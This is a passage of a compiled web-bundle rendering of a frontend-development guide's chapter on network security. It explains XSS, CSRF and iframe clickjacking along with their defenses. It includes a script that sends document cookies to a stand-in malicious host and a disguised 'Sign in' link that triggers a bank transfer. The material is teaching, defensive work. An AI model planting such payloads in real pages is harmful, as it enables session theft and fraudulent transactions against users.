Facebook, and the site renders it as part of the site for my followers."}),"\n",(0,n.jsx)(s.pre,{"data-language":"html","data-theme":"default",children:(0,n.jsxs)(s.code,{"data-language":"html","data-theme":"default",children:[(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"<"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-string-expression)"},children:"script"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:">"})]}),"\n",(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"  "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"fetch"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"("}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-string-expression)"},children:'"http://my-malicious-site.com/api"'}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-punctuation)"},children:","}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" {"})]}),"\n",(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"    body"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:":"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-constant)"},children:"document"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:".cookies"})]}),"\n",(0,n.jsx)(s.span,{className:"line",children:(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"  })"})}),"\n",(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"</"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-string-expression)"},children:"script"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:">"})]})]})}),"\n",(0,n.jsx)(s.p,{children:"This would send me all of their cookies (including their API token), which I could use to login in as them."}),"\n",(0,n.jsxs)(s.p,{children:["This is called cross-site scripting (or XSS), and is the reason why cookies ",(0,n.jsx)(s.a,{href:"https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#block_access_to_your_cookies",children:"can be set"})," to be unreadable in JS."]}),"\n",(0,n.jsxs)(s.p,{children:["To further protect yourself, sites can define a ",(0,n.jsx)(s.a,{href:"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",children:"content security policy"})," (or CSP), which defines which scripts can run (for example, by totally banning inline scripts or requiring them to match a certain hash)."]}),"\n",(0,n.jsx)(s.h3,{id:"csrf",children:"CSRF"}),"\n",(0,n.jsx)(s.p,{children:"Well, if a malicious actor can't log in as you, perhaps they could trick you into doing something bad. One way to do that is with cross-site request forgery (CSRF), or making it appear as if you initiated an action that you didn't (at least knowingly). For example, I could write a page that looks like this:"}),"\n",(0,n.jsx)(s.pre,{"data-language":"html","data-theme":"default",children:(0,n.jsx)(s.code,{"data-language":"html","data-theme":"default",children:(0,n.jsxs)(s.span,{className:"line",children:[(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:"<"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-string-expression)"},children:"a"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-function)"},children:"href"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-keyword)"},children:"="}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-string-expression)"},children:'"https://yourbank.com/api/transfer?to=mybank&amount=100000"'}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:">Sign in</"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-token-string-expression)"},children:"a"}),(0,n.jsx)(s.span,{style:{color:"var(--shiki-color-text)"},children:">"})]})})}),"\n",(0,n.jsx)(s.p,{children:"You might click that link thinking you're about to sign in, and then you transfer $100,000 to me because your browser did initiate a request to your bank's API with your auth cookies!"}),"\n",(0,n.jsx)(s.p,{children:'To protect against this, most sites implement "CSRF tokens" or random tokens stored in memory (or in a cookie) that can be used to prove that the requestor wasn\'t a random site. For example, I can store a JS-readable cookie that has a random value in it, and if the API request doesn\'t include that value, I can assume it was not made from my frontend (or "forged").'}),"\n",(0,n.jsx)(s.h3,{id:"frames",children:"Frames"}),"\n",(0,n.jsxs)(s.p,{children:["While CSRF protects unauthorized user requests, an old attack was to embed people's sites in iframes. ",(0,n.jsx)(s.a,{href:"https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe",children:"Iframes"})," allow you to embed other websites, and while useful for sharding our your site, they can also be used maliciously."]}),"\n",(0,n.jsx)(s.p,{children:'For a contrived example, pretend I know who you bank with and can assume that you\'re signed in. I could construct a URL for the transfer page to transfer my back account some amount of money from yours, and show you that page in an IFrame (which is scrolled to the exact position of the "Transfer" button) and put a transfer button on my site as part of some user-facing flow.'}),"\n",(0,n.jsxs)(s.p,{children:["For this reason, sites can now define a content security policy or ",(0,n.jsx)(s.a,{href:"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options",children:"header"})," to prevent them from being iframed."]}),"\n"]})}let d={MDXContent:function(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},{wrapper:s}=Object.assign({},(0,a.a)(),e.components);return s?(0,n.jsx)(s,{...e,children:(0,n.jsx)(_createMdxContent,{...e})}):_createMdxContent(e)},pageOpts:{filePath:"pages/network.mdx",route:"/network",timestamp:1720295599e3,pageMap:[{kind:"Meta",data:{index:{type:"page",title:"Frontend docs",display:"hidden",theme:{layout:"raw"}},foreword:"Foreword","-- Platform":{type:"separator",title:"WEB FUNDAMENTALS"},html:"Chapter 1: HTML",css:"Chapter 2: CSS",javascript:"Chapter 3: JavaScript","-- React":{type:"separator",title:"REACT ESSENTIALS"},components:"Chapter 4: Components",applications:"Chapter 5: Applications","build-tooling":"Chapter 6: Build tooling","profiling-and-testing":"Chapter 7: Profiling & testing","-- Design":{type:"separator",title:"DESIGN PRINCIPLES"},"design-systems":"Chapter 8: Design systems",graphics:"Chapter 9: Graphics","-- Data":{type:"separator",title:"DATA ARCHITECTURE"},state:"Chapter 10: Managing state",network:"Chapter 11: Network & sync","client-compute":"Chapter 12: Client compute",contact:{title:"Want updates? Follow me on Twitter ↗",type:"page",href:"https://twitter.com/tomasreimers",newWindow:!0}}},{kind:"MdxPage",name:"applications",route:"/applications"},{kind:"MdxPage",name:"build-tooling",route:"/build-tooling"},{kind:"MdxPage",name:"client-compute",route:"/client-compute"},{kind:"MdxPage",name:"components",route:"/components"},{kind:"MdxPage",name:"css",route:"/css"},{kind:"MdxPage",name:"design-systems",route:"/design-systems"},{kind:"MdxPage",name:"foreword",route:"/foreword"},{kind:"MdxPage",name:"graphics",route:"/graphics"},{kind:"MdxPage",name:"html",route:"/html"},{kind:"MdxPage",name:"index",route:"/"},{kind:"MdxPage",name:"javascript",route:"/javascript"},{kind:"MdxPage",name:"network",route:"/network"},{kind:"MdxPage",name:"profiling-and-testing",route:"/profiling-and-testing"},{kind:"MdxPage",name:"state",route:"/state"}],flexsearch:{codeblocks:!0},title:"Network: Old page, new data",headings:h},pageNextRoute:"/network",nextraLayout:o.ZP,themeConfig:i.Z};var p=(0,r.j)(d)}},function(e){e.O(0,[3678,9774,2888,179],function(){return e(e.s=8387)}),_N_E=e.O()}]);